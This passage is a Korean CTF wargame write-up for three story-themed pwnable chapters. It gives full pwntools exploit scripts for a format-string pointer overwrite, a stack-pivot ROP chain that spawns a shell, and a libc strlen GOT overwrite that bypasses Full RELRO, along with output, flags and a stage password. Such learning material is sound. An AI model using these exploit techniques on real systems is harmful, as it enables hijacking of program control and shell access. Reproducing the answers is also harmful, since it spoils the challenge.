![8](/assets/img/spacealone/8/2.jpg)
![8](/assets/img/spacealone/8/3.jpg)
![8](/assets/img/spacealone/8/4.jpg)
![8](/assets/img/spacealone/8/5.jpg)
![8](/assets/img/spacealone/8/6.jpg)
![8](/assets/img/spacealone/8/7.jpg)


CH7에서 GOT 변조를 통해 Canary 보호 기법을 무력화했다면, 이번 **CH8(fsb)**은 사용자 입력이 출력 함수의 인자로 직접 전달될 때 발생하는 **Format String Bug(FSB)**를 이용해 스택에 존재하는 함수 포인터를 변조하고, 권한이 필요한 비상 함수를 강제로 호출하는 기법을 다룹니다.


---


#### 25.1 바이너리 분석 및 취약점 확인


`checksec` 실행 결과, **No PIE** 상태이므로 함수의 절대 주소가 고정되어 있으며, **Partial RELRO**가 적용되어 있습니다. 특징적인 점은 **Canary**가 존재하지만, 이번 공격은 스택 버퍼 오버플로우가 아닌 메모리 직접 쓰기(FSB)를 사용하므로 Canary를 손상시키지 않고도 공격이 가능합니다.


```bash
Awakening_in_the_Dark@hsapce-io:~$ checksec fsb
[*] '/home/Awakening_in_the_Dark/fsb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


소스 코드 `fsb.c`에서 결정적인 취약점은 `case 1`의 `printf` 호출 부분입니다.


```c
void open_emergency_medicine(){
    // flag를 읽어주는 비상 함수
    ...
    int fd = open("flag" , O_RDONLY);
    read(fd,buf,20);
    printf("%s\n",buf);
}

int main(){
    int *exitst_or_not=(int *)exist; // 스택에 존재하는 함수 포인터 (Target)
    char buf[0x100];
    ...
    case 1:
        memset(buf,0,0x100);
        read(0, buf, 0x9f);
        printf(buf); // FSB 취약점 발생!
        ...
    case 2:
        if(exitst_or_not != NULL){
            (*(void (*)()) exitst_or_not)(); // 변조된 포인터 실행 지점
        }
```


`printf(buf)`에서 형식 지정자 없이 사용자 입력을 출력하므로, `%n` 지정자를 사용하여 메모리의 특정 주소에 원하는 값을 쓸 수 있습니다. 우리의 목표는 `exitst_or_not` 포인터를 `open_emergency_medicine` 함수의 주소로 덮어쓰는 것입니다.


---


#### 25.2 공격 설계 (Exploit Strategy)


1. **주소 및 오프셋 식별**:
   - `nm` 명령어를 통해 `open_emergency_medicine`의 주소가 `0x401256`임을 확인합니다.
   - `%p`를 이용해 스택 주소를 릭(Leak)하고, 이를 바탕으로 스택 상의 `exitst_or_not` 변수 주소를 계산합니다. (`buf_addr - 8`)
   - `AAAAAAAA` 입력과 `%p` 연쇄를 통해 입력 버퍼가 스택의 **8번째** 인덱스부터 시작됨을 파악했습니다.


2. **Arbitrary Write (%n)**:
   - `%[value]c%[index]$ln` 형식을 사용하여 `exitst_or_not` 주소에 `0x401256` 값을 써넣습니다. 
   - 64비트 메모리 정렬을 위해 페이로드 앞부분을 16바이트로 맞추어(`ljust(16)`), 실제 주소값이 **10번째** 오프셋에 위치하도록 설계합니다.


---


#### 25.3 익스플로잇 실행 (Python Script)


```python
from pwn import *

context.arch = 'amd64'
p = process('./fsb')

# 1. Target Address 식별 (nm fsb | grep open)
oem_addr = 0x401256

# 2. Stack Leak 및 변수 주소 계산
p.sendlineafter(b'> ', b'1')
p.sendline(b'%p')
leak = int(p.recvline(), 16)
target_addr = leak - 8 # exitst_or_not 변수의 위치

print(f"[*] Leak: {hex(leak)}")
print(f"[*] Target (exitst_or_not): {hex(target_addr)}")

# 3. FSB Payload 구성
# 16바이트 정렬을 통해 p64(target_addr)가 10번째 오프셋에 위치하도록 설정
payload = f"%{oem_addr}c%10$ln".encode().ljust(16, b"A")
payload += p64(target_addr)

p.sendlineafter(b'> ', b'1')
p.send(payload + b"\n")

# 4. Trigger (메뉴 2번 선택 시 변조된 함수 호출)
p.sendlineafter(b'> ', b'2')

p.interactive()
```


---


#### 25.4 결과 및 플래그 획득


익스플로잇을 실행하고 2번 메뉴를 호출하면, 원래 실행되어야 할 `exist` 함수 대신 `open_emergency_medicine`이 실행되면서 성공적으로 플래그를 탈취합니다.


```bash
Awakening_in_the_Dark@hsapce-io:~$ python3 ex.py
[+] Starting local process './fsb': pid 45132
[*] Leak: 0x7ffd...
[*] Target (exitst_or_not): 0x7ffd...
...
1. search medicine
2. take medicine
3. quit
> 2
fsbeeee
```


---


### 26. CH8 요약 및 교훈


1. **포맷 스트링의 위험성**: 단순한 출력 함수도 인자 제어 여부에 따라 강력한 메모리 읽기/쓰기 도구가 될 수 있습니다.
2. **64비트 메모리 정렬**: 64비트 환경에서 `%n`을 사용할 때는 스택 주소값이 8바이트 단위로 정렬되어야 오프셋을 정확히 참조할 수 있습니다.
3. **Control Flow 타겟팅**: GOT뿐만 아니라 스택에 존재하는 함수 포인터 역시 공격자의 매력적인 타겟이 됩니다.

## 26. CH9

![9](/assets/img/spacealone/9/1.jpg)
![9](/assets/img/spacealone/9/2.jpg)
![9](/assets/img/spacealone/9/3.jpg)
![9](/assets/img/spacealone/9/4.jpg)
![9](/assets/img/spacealone/9/5.jpg)
![9](/assets/img/spacealone/9/6.jpg)
![9](/assets/img/spacealone/9/7.jpg)
![9](/assets/img/spacealone/9/8.jpg)
![9](/assets/img/spacealone/9/9.jpg)
![9](/assets/img/spacealone/9/10.jpg)
![9](/assets/img/spacealone/9/11.jpg)
![9](/assets/img/spacealone/9/12.jpg)
![9](/assets/img/spacealone/9/13.jpg)
![9](/assets/img/spacealone/9/14.jpg)
![9](/assets/img/spacealone/9/15.jpg)

이전 챕터에서 메모리 값을 직접 조작했다면, **CH9**는 부족한 스택 오버플로우 공간과 재진입 방지 로직(`loop` 변수)을 극복하기 위해 실행 흐름의 '판'을 통째로 바꾸는 **Stack Pivoting** 기법을 다룹니다.


### 26.1 취약점 분석 및 제약 사항


바이너리 분석 결과, `main` 함수에서 `read(0, buf, 0x70)`를 통해 오버플로우가 발생하지만, `buf` 크기가 `0x30`이라 실제 조작 가능한 공간은 약 64바이트에 불과합니다.


```c
void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}

int main(void) {
    char buf[0x30];
    ...
    if (loop) { exit(-1); } // 재진입 불가
    loop = 1;
    read(0, buf, 0x70); // Overflow 발생 (공간 협소)
    return 0;
}
```


- **공간 부족**: Libc 주소를 릭하고 쉘을 따는 ROP 체인을 한 번에 구성하기엔 64바이트가 너무 부족합니다.
- **재진입 불가**: `loop` 변수가 1로 설정되어 `main`으로 다시 돌아가도 `exit`가 호출됩니다.


### 26.2 공격 설계 (Stack Pivoting)


부족한 스택 공간을 해결하기 위해 고정 주소인 **BSS 영역**을 새로운 스택으로 활용합니다.


1. **Stage 1 (Pivot)**: 첫 번째 입력에서 `rbp`를 `bss` 영역으로 덮고 `leave; ret` 가젯을 호출합니다. `leave` 명령어(`mov rsp, rbp; pop rbp`)에 의해 `rsp`가 BSS 영역으로 이동하며 스택이 교체됩니다.
2. **Stage 2 (Leak)**: BSS 영역에 작성된 ROP 체인을 통해 `puts(read@got)`를 실행하여 Libc 베이스 주소를 계산합니다.
3. **Stage 3 (Shell)**: 계산된 주소를 바탕으로 `system("/bin/sh")`를 호출하여 최종적으로 쉘을 획득합니다.


### 26.3 익스플로잇 코드 (ex.py)


```python
from pwn import *
from time import sleep

p = process('./pivot')
e = ELF('./pivot')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret = 0x40101a
pop_rdi = 0x4011e5
pop_rsi_r15 = 0x4011e7
pop_rdx = 0x4011eb
leave_ret = 0x40127b
bss = e.bss() + 0x800

# Stage 1: Pivot to BSS
payload = b'a' * 0x30 + p64(bss)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(e.sym['read']) + p64(leave_ret)
p.sendafter(b'laboratory.\n', payload)
sleep(1)

# Stage 2: Libc Leak & Chain Shell
payload = p64(bss)
payload += p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(e.sym['read']) + p64(leave_ret)
p.send(payload)
sleep(1)

# Stage 3: Get Shell
l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']

payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```


### 26.4 결과 및 플래그 획득


익스플로잇 실행 결과, 성공적으로 BSS 영역을 통해 실행 흐름을 제어하고 플래그를 확인했습니다.


```bash
[+] Starting local process './pivot': pid 45595
[*] Switching to interactive mode
$ status
UID: 510
Chapter10 PW: bss_is_useful
```


---


## 27. 요약 및 교훈


1. **스택 피보팅의 위력**: 스택 오버플로우 공간이 매우 제한적인 상황에서도 고정된 메모리 영역을 활용해 ROP 체인을 무한히 확장할 수 있습니다.
2. **함수 정렬(Alignment)**: 64비트 환경에서 `system` 함수 호출 전 `ret` 가젯을 넣어 16바이트 스택 정렬을 맞추는 것이 중요합니다.
3. **가젯 활용**: 바이너리 내에 존재하는 `leave; ret`와 같은 가젯이 어떻게 레지스터(`rbp`, `rsp`)를 조작하는지 이해하는 것이 공격의 핵심입니다.

## 28. CH10


![Final-Story](/assets/img/spacealone/10/1.jpg)
![Final-Story](/assets/img/spacealone/10/2.jpg)
![Final-Story](/assets/img/spacealone/10/3.jpg)
![Final-Story](/assets/img/spacealone/10/4.jpg)
![Final-Story](/assets/img/spacealone/10/5.jpg)
![Final-Story](/assets/img/spacealone/10/6.jpg)
![Final-Story](/assets/img/spacealone/10/7.jpg)
![Final-Story](/assets/img/spacealone/10/8.jpg)
![Final-Story](/assets/img/spacealone/10/9.jpg)
![Final-Story](/assets/img/spacealone/10/10.jpg)
![Final-Story](/assets/img/spacealone/10/11.jpg)
![Final-Story](/assets/img/spacealone/10/12.jpg)
![Final-Story](/assets/img/spacealone/10/13.jpg)
![Final-Story](/assets/img/spacealone/10/14.jpg)


드디어 마지막 관문입니다. 인류를 구할 백신이 눈앞에 있지만, 시스템은 모든 현대적 보호 기법(Full RELRO, PIE, Canary, NX)으로 무장되어 있습니다. 마지막 보안 시스템을 뚫고 백신을 확보해야 합니다.


### 28.1 취약점 분석 (Analysis)


최종 챕터의 바이너리 `final`은 모든 보호 기법이 활성화되어 있어 일반적인 Stack Overflow로는 공략이 불가능에 가깝습니다.


```bash
[*] 'final'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


바이너리 자체는 **Full RELRO**이므로 바이너리 내의 GOT 직접 변조가 불가능합니다. 하지만 **Libc 라이브러리 자체는 Partial RELRO** 상태인 점을 이용합니다.


### 28.2 공격 설계 (Exploit Strategy)


`puts` 함수가 내부적으로 호출하는 **Libc 내의 `strlen` GOT**를 `system` 함수 주소로 변조하는 전략을 사용합니다.


1. **Information Leak**: `check_id` 단계에서 `%33$p` 포맷 스트링을 통해 스택에 남은 `__libc_start_main` 관련 주소를 유출하고 Libc 베이스 주소를 계산합니다.
2. **Libc GOT Overwrite**: `check_passwd` 함수 내의 `fprintf(access_log, passwd)`에서 발생하는 FSB 취약점을 이용합니다. Libc 내부의 `strlen@got` 주소에 `system` 주소를 2바이트씩 나누어(`%hn`) 작성합니다.
3. **Execution**: `main` 함수 마지막의 `puts(password)` 호출 시, `password` 버퍼에 미리 담아둔 `/bin/sh;` 문자열이 `system` 함수의 인자로 들어가며 셸이 실행됩니다.


### 28.3 익스플로잇 코드 (ex.py)


```python
from pwn import *

p = process('./final')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Step 1: Libc Leak
# %33$p를 통해 libc_start_main+offset 주소를 릭합니다.
p.sendafter(b'Enter ID Number\n', b"%33$p\n")
leak = int(p.recvline()[:-1], 16)
libc_base = leak - 0x29d90 # 환경에 맞는 오프셋 계산 (readelf/gdb 활용)
system_addr = libc_base + 0x50d70
strlen_got = libc_base + 0x21a098 # Libc 내부의 strlen GOT 주소

# Step 2: FSB Payload 구성
# strlen@got를 system 함수 주소로 덮어씁니다.
system1 = system_addr & 0xffff
system2 = (system_addr >> 16) & 0xffff

payload = b"/bin/sh;"
payload += f"%{system1 - 8}c%33$hn".encode()
payload += f"%{0x10000 - system1 + system2}c%34$hn".encode()
payload = payload.ljust(0x28, b'a')
payload += p64(strlen_got) + p64(strlen_got + 2)

# Step 3: 공격 전송 및 권한 획득
p.sendafter(b'Your ID : ', b'Lord Of Buffer overflow')
p.sendafter(b'Password : ', payload)

p.interactive()
```


### 28.4 결과 및 엔딩 (The Cure)


성공적으로 `epilogue` 사용자의 권한을 획득하고, 최종 목표인 `./get_vaccine`을 실행하여 인류를 구하는 엔딩을 확인했습니다.


---


## 29. 요약 및 교훈


1. **Full RELRO 우회**: 바이너리에 Full RELRO가 걸려 있어도 연관된 라이브러리(Libc)가 Partial RELRO라면 GOT Overwrite의 타겟이 될 수 있습니다.
2. **FSB의 범용성**: 포맷 스트링 취약점은 단순한 주소 유출을 넘어, 메모리 쓰기 제한이 있는 환경에서 실행 흐름을 뒤바꾸는 핵심 도구가 됩니다.
3. **Pwnable의 마침표**: 정보 유출부터 흐름 제어까지, 그동안 배운 모든 기법을 유기적으로 연결해야 해결할 수 있는 완성도 높은 문제였습니다.